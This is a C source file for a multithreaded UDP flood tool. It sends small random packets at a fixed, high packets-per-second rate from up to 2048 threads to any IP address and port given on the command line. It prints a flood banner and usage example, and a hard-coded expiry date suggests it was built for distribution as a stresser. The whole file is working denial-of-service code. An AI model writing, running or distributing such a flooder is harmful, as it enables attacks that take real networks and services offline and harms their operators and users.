#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/time.h>

#define EYR 2029
#define EMN 1
#define EDY 10
#define MAX_T 2048
#define MIN_PKT 12
#define MAX_PKT 24

typedef struct {
    char *ip;
    int pt, dur, th_id;
    int pkt_size;
    double target_pps;  // Target packets per second per thread
} p_t;

volatile int run = 1;

void sig(int s) { run = 0; }

// High precision timing
double get_time_ms() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec * 1000.0 + tv.tv_usec / 1000.0;
}

// Fast random generator
unsigned int fast_rand() {
    static unsigned int seed = 0;
    seed = seed * 1103515245 + 12345;
    return (unsigned int)(seed >> 16);
}

void *wk(void *a) {
    p_t *p = (p_t*)a;
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(s < 0) return 0;
    
    // Max socket buffer
    int buf_size = 1024 * 1024 * 8; // 8MB
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &buf_size, sizeof(buf_size));
    
    // Disable Nagle for UDP (already off, but ensure)
    int flag = 1;
    setsockopt(s, IPPROTO_UDP, UDP_NODELAY, &flag, sizeof(flag));
    
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(p->pt);
    target.sin_addr.s_addr = inet_addr(p->ip);
    
    char packet[MAX_PKT];
    int pkt_size = p->pkt_size;
    
    // Pre-fill random packet
    for(int i = 0; i < pkt_size; i++) {
        packet[i] = fast_rand() & 0xFF;
    }
    
    double start_time = get_time_ms();
    double next_send_time = start_time;
    double interval_ms = 1000.0 / p->target_pps;  // Time between packets (ms)
    long long packets_sent = 0;
    double current_time;
    
    printf("Thread %d: Target %.0f pps (interval %.3fms)\n", p->th_id, p->target_pps, interval_ms);
    
    // CONSTANT PPS LOOP - busy wait for exact timing
    while(run) {
        current_time = get_time_ms();
        
        // Check duration
        if(current_time - start_time >= p->dur * 1000.0) break;
        
        // Busy wait until exact send time
        while(current_time < next_send_time) {
            current_time = get_time_ms();
        }
        
        // Send packet
        sendto(s, packet, pkt_size, MSG_NOSIGNAL, (struct sockaddr*)&target, sizeof(target));
        packets_sent++;
        
        // Rotate packet data for variation
        packet[0] = fast_rand() & 0xFF;
        
        // Schedule next packet
        next_send_time += interval_ms;
    }
    
    double elapsed = current_time - start_time;
    double actual_pps = packets_sent / (elapsed / 1000.0);
    
    printf("Thread %d: %.0f pps (target %.0f) - %lld pkts in %.2fs\n", 
           p->th_id, actual_pps, p->target_pps, packets_sent, elapsed/1000.0);
    
    close(s);
    return 0;
}

int main(int c, char **v) {
    signal(SIGINT, sig);
    
    time_t t; time(&t);
    struct tm *l = localtime(&t);
    
    if(l->tm_year+1900 > EYR || 
       (l->tm_year+1900 == EYR && (l->tm_mon+1 > EMN || 
       (l->tm_mon+1 == EMN && l->tm_mday > EDY)))) {
        printf("EXPIRED\n");
        return 1;
    }
    
    if(c != 7) {
        printf("Usage: %s <ip> <port> <time> <packet_size> <threads> <target_pps_per_thread>\n", v[0]);
        printf("Example: %s 192.168.1.1 80 60 12 16 150000\n", v[0]);
        printf("Packet size: 12-24 bytes\n");
        return 1;
    }
    
    char *ip = v[1];
    int pt = atoi(v[2]), dur = atoi(v[3]), pkt_size = atoi(v[4]), th = atoi(v[5]);
    double target_pps_per_thread = atof(v[6]);
    
    if(pkt_size < MIN_PKT || pkt_size > MAX_PKT) {
        printf("ERROR: Packet size must be %d-%d bytes\n", MIN_PKT, MAX_PKT);
        return 1;
    }
    
    if(pt < 1 || dur < 1 || th < 1 || th > MAX_T || target_pps_per_thread < 1000) {
        printf("Invalid parameters (pps min 1000)\n");
        return 1;
    }
    
    double total_target_pps = target_pps_per_thread * th;
    
    printf("\n=== CONSTANT PPS FLOOD ===\n");
    printf("Target: %s:%d\n", ip, pt);
    printf("Duration: %d seconds\n", dur);
    printf("Packet size: %d bytes\n", pkt_size);
    printf("Threads: %d\n", th);
    printf("PPS per thread: %.0f\n", target_pps_per_thread);
    printf("TOTAL TARGET PPS: %.0f\n", total_target_pps);
    printf("==========================\n\n");
    
    pthread_t tds[MAX_T];
    p_t ps[MAX_T];
    
    for(int i = 0; i < th; i++) {
        ps[i].ip = ip;
        ps[i].pt = pt;
        ps[i].dur = dur;
        ps[i].pkt_size = pkt_size;
        ps[i].th_id = i;
        ps[i].target_pps = target_pps_per_thread;
        pthread_create(&tds[i], NULL, wk, &ps[i]);
    }
    
    for(int i = 0; i < th; i++) {
        pthread_join(tds[i], NULL);
    }
    
    printf("\nConstant flood finished - check dstat for flat PPS line\n");
    return 0;
}